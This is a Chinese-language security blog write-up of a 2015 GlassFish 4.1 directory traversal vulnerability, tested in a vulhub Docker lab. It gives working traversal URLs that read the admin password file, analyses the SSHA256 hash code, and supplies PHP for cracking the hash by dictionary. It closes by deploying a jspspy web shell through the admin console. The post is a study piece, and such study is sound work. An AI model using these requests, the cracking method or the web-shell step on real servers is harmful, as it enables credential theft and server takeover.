> 原文链接: https://www.anquanke.com//post/id/85948 


# 【技术分享】GlassFish 目录穿越漏洞测试过程


                                阅读量   
                                **147810**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p2.ssl.qhimg.com/t01b0080a42e66ff5f5.jpg)](https://p2.ssl.qhimg.com/t01b0080a42e66ff5f5.jpg)

这是一个2015年的老漏洞，由于我最近在学习相关的知识，所以拿出来温习一下。

<br>

**搭建测试环境**



vulhub（ [https://github.com/phith0n/vulhub](https://github.com/phith0n/vulhub) ）是我学习各种漏洞的同时，创建的一个开源项目，旨在通过简单的两条命令，编译、运行一个完整的漏洞测试环境。

如何拉取项目、安装docker和docker-compose我就不多说了，详见vulhub项目主页。来到GlassFish这个漏洞的详细页面 [https://github.com/phith0n/vulhub/tree/master/glassfish/4.1.0](https://github.com/phith0n/vulhub/tree/master/glassfish/4.1.0) ，可以查看一些简要说明。

在主机上拉取vulhub项目后，进入该目录，执行docker-compose build和docker-compose up -d两条命令，即可启动整个环境。

本测试环境默认对外开放两个端口：8080和4848。8080是web应用端口，4848是管理GlassFish的端口，漏洞出现在4848端口下，但无需登录管理员账号即可触发。

<br>

**文件读取漏洞利用**



漏洞原理与利用方法 [https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904](https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904) 。利用该目录穿越漏洞，可以列目录以及读取任意文件：

```
https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config
https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config/admin-keyfile
```

[![](https://p5.ssl.qhimg.com/t01ea50d05f9157f939.jpg)](https://www.leavesongs.com/media/attachment/2017/04/23/b7cb8c56-f960-4cc6-b82b-0d5585ea6839.jpg)

glassfish/domains/domain1/config/admin-keyfile是储存admin账号密码的文件，如上图，我们通过读取这个文件，拿到超级管理员的密码哈希。（说明一下，这个测试环境启动前，我通过修改docker-compose.yml，将超级管理员的密码改为了123456）

<br>

**密码加密方式？**



可见，我们读到的密码是一串base64编码后的字符串，并且得到一个关键字：ssha256，这种“加密”方法可能和sha256有关。但，使用echo strlen(base64_decode(…));这个方式将上述base64字符串解码后测量长度，发现长为40字节。

我们知道，常见的哈希算法，md5长度为16字节，sha1长度为20字节，sha256长度为32字节，sha512长度为64字节，并没有长度为40字节的哈希算法呀？

很明显，SSHA256里应该掺杂有其他字符。

所以，我们需要研究研究GlassFish源码。官网有SVN，但下载速度太慢。我们可以上Github下载打包好的源码 [https://github.com/dmatej/Glassfish/archive/master.zip](https://github.com/dmatej/Glassfish/archive/master.zip) （不过这个源码比较老了）

下载以后发现，压缩包竟然都有1个多G，在如此大的代码中，找一个哈希算法，真的不容易。不过在费尽千辛万苦后我还是找到了负责计算哈希的类：SSHA。

[https://github.com/dmatej/Glassfish/blob/master/main/nucleus/common/common-util/src/main/java/org/glassfish/security/common/SSHA.java](https://github.com/dmatej/Glassfish/blob/master/main/nucleus/common/common-util/src/main/java/org/glassfish/security/common/SSHA.java)

这个类有两个比较重要的方法，encode和compute。compute负责对明文进行哈希计算，encode负责将前者的计算结果编码成base64。

<br>

**encode函数分析**



先从简单的来，encode函数：

```
public static String encode(byte[] salt, byte[] hash, String algo)`{`       
    boolean isSHA = false;
    if (algoSHA.equals(algo)) `{`
        isSHA = true;
    `}`
    if (!isSHA) `{`
        assert (hash.length == 32);
    `}` else `{`
        assert (hash.length == 20);
    `}`
    int resultLength = 32;
    if (isSHA) `{`
        resultLength = 20;
    `}`
    byte[] res = new byte[resultLength+salt.length];
    System.arraycopy(hash, 0, res, 0, resultLength);
    System.arraycopy(salt, 0, res, resultLength, salt.length);
    GFBase64Encoder encoder = new GFBase64Encoder();
    String encoded = encoder.encode(res);
    String out = SSHA_256_TAG + encoded;
    if(isSHA) `{`
        out = SSHA_TAG + encoded;
    `}`
    return out;`}`
```

可见，该函数兼容两种哈希算法，isSHA表示的是长度为20字节的sha1，!isSHA表示的长度为32字节的sha256。

根据我们通过文件读取漏洞得到的哈希长度和SSHA256这个关键词，我可以100%推测该哈希是sha256。看到System.arraycopy(salt, 0, res, resultLength, salt.length);这一行我就明白了：为什么我们读取到的哈希长度是40字节？

因为还有8字节是salt。整个算法大概是这样：

```
base64_encode( hash( 明文, SALT ) + SALT )
```

hash结果是32字节，salt长度8字节，将两者拼接后base64编码，最终得到我们读取到的那个哈希值。

注意，上述所有的算法都是“raw data”。我们平时看到的a356f21e901b…这样的哈希结果是经过了hex编码的，本文不涉及任何hex编码。

<br>

**compute函数分析**



再来分析一下复杂一点的函数compute：

```
public static byte[] compute(byte[] salt, byte[] password, String algo)
    throws IllegalArgumentException`{`
    byte[] buff = new byte[password.length + salt.length];
    System.arraycopy(password, 0, buff, 0, password.length);
    System.arraycopy(salt, 0, buff, password.length, salt.length);
    byte[] hash = null;
    boolean isSHA = false;
    if(algoSHA.equals(algo)) `{`
        isSHA = true;
    `}`
    MessageDigest md = null;
    try `{`
        md = MessageDigest.getInstance(algo);
    `}` catch (Exception e) `{`
        throw new IllegalArgumentException(e);
    `}`
    assert (md != null);
    md.reset();
    hash = md.digest(buff);
    if (!isSHA) `{`
        for (int i = 2; i &lt;= 100; i++) `{`
            md.reset();
            md.update(hash);
            hash = md.digest();
        `}`
    `}`    
    if (isSHA) `{`
        assert (hash.length == 20); // SHA output is 20 bytes
    `}`
    else `{`
        assert (hash.length == 32); //SHA-256 output is 32 bytes
    `}`
    return hash;`}`
```

**这个函数接受三个参数：SALT、明文和算法。其主要过程如下：**

1. 拼接明文和SALT，组成一个新的字符序列BUFF

2. 计算BUFF的哈希结果

3. 如果哈希算法是sha256，则再计算99次哈希结果，前一次的计算结果是下一次计算的参数

**将整个过程翻译成PHP代码以方便理解与测试：**

```
&lt;?php$algo = 'sha256';$e = $plain . $salt;$data = hash($algo, $e, true);if ($algo == 'sha256') `{`
    for ($i = 2; $i &lt;= 100; $i++) `{`
        $data = hash($algo, $data, true);
    `}``}`echo base64_encode($data . $salt);
```

**<br>**

**破解密码**



测试一下我的代码是否正确。首先通过任意文件读取漏洞读取到目标服务器密文是`{`SSHA256`}`52bI8VDr9aLll3hQHhJS/45141bDudXHDMyFx97dBzL9wVu03KQDtw==，将其进行base64解码后，拿到末尾8个字节，是为salt，值为xfdxc1x5bxb4xdcxa4x03xb7。

填入php代码中，计算明文123456的结果：

[![](https://p2.ssl.qhimg.com/t01ae3b6f35173456bb.jpg)](https://p2.ssl.qhimg.com/t01ae3b6f35173456bb.jpg)

可见，计算结果和我通过漏洞读取的结果一致，说明计算过程没有问题。

不过我简单看了一下，hashcat并不支持这种哈希算法，所以如果需要破解密文的话，估计得自己编写相关破解的代码了。好在算法并不难，直接使用我给出的实例代码，循环跑字典即可。

<br>

**Getshell**



破解了密码，进入GlassFish后台，是可以直接getshell的。

点击Applications，右边的deploy：

[![](https://p5.ssl.qhimg.com/t015db295e222c980ca.png)](https://www.leavesongs.com/media/attachment/2017/04/23/a4dcc8cb-400f-4e84-8733-91f3cbcbc83e.jpg)

部署一个新应用，直接上传war包（附件中给一个测试环境java1.8能使用的包，网上找的老版本jspspy，加上自己改了一下兼容性，然后打包了。2016版的jspspy我没找着，该jspspy不能保证没有后门）：

[![](https://p1.ssl.qhimg.com/t01e019b5fb7d93e0e5.png)](https://www.leavesongs.com/media/attachment/2017/04/23/d2f342b1-42c7-4e0c-b95b-03daf2b758fe.jpg)

然后访问http://your-ip:8080/jspspy/jspspy.jsp即可，密码xxxxxx：

[![](https://p3.ssl.qhimg.com/t01076d75cb512f902a.png)](https://www.leavesongs.com/media/attachment/2017/04/23/01535ebd-d1f6-4cd4-84bd-3fbf837bdda1.jpg)
